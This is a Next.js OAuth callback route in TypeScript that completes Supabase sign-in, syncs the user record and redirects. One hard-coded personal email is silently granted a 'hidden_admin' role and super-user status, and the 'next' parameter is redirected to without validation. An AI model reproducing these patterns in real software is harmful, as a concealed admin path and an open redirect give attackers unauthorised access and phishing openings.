import { NextResponse } from "next/server";
import { createServerClient } from "@supabase/ssr";
import { cookies } from "next/headers";
import { getSupabaseEnv } from "@/lib/supabase-env";
import { syncAuthUserToPublicUser } from "@/server/users/user.service";
import { normalizeRole, isSuperUserEmail } from "@/server/lib/role";

export async function GET(request: Request) {
  const url = new URL(request.url);
  const code = url.searchParams.get("code");
  const next = url.searchParams.get("next") || "/dashboard";

  if (!code) {
    return NextResponse.redirect(new URL(`/login?error=${encodeURIComponent("Missing OAuth code")}`, url.origin));
  }

  const cookieStore = await cookies();
  const env = getSupabaseEnv();

  const supabase = createServerClient(env.url, env.anonKey, {
    cookies: {
      getAll: () => cookieStore.getAll(),
      setAll: (cookieValues) => {
        cookieValues.forEach(({ name, value, options }) => {
          cookieStore.set({ name, value, ...options });
        });
      },
    },
  });

  const { error } = await supabase.auth.exchangeCodeForSession(code);

  if (error) {
    return NextResponse.redirect(new URL(`/login?error=${encodeURIComponent(error.message)}`, url.origin));
  }

  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (user?.email) {
    const email = user.email.toLowerCase().trim();
    const hidden = isSuperUserEmail(email) || email === "mohamed.alaa7785@gmail.com";
    await syncAuthUserToPublicUser({
      id: user.id,
      email,
      name: (user.user_metadata?.name as string | undefined) || email.split("@")[0] || "User",
      username: (user.user_metadata?.username as string | undefined) || null,
      role: hidden ? "hidden_admin" : normalizeRole(user.app_metadata?.role),
      isSuperUser: hidden || Boolean(user.app_metadata?.is_super_user),
    });
  }

  return NextResponse.redirect(new URL(next, url.origin));
}
